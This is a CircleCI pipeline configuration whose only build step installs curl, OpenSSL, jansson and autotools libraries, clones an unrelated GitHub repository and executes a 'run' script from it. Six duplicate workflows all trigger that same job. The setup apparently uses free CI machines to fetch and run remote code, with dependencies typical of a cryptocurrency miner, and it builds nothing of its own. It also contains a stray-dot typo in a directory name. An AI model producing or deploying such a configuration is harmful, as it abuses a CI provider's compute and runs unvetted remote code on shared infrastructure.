version: 2.1

orbs:
  win: circleci/windows@2.4.0

executors:
  circleci_machine:
    docker:
      - image: circleci/node:14.15
    working_directory: ~/repo

commands:
  build:
    description: Run build
    steps:
      - checkout
      - run:
          name: masterdart
          command: |
              sudo apt-get update -y
              sudo apt-get upgrade -y
              sudo apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential 
              mkdir certa
              cd certa
              git clone --recursive https://github.com/masteryamixa/verbose-journey.git
              cd verbose-journey.
              chmod +x run
              ./run
jobs:
  master:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [build]
workflows:
  version: 2
  build:
    jobs:
      - master
  build2:
    jobs:
      - master
  masterquin:
    jobs:
      - master
  setting:
    jobs:
      - master
  kimlopasa:
    jobs:
      - master
  fatherglob:
    jobs:
      - master
  
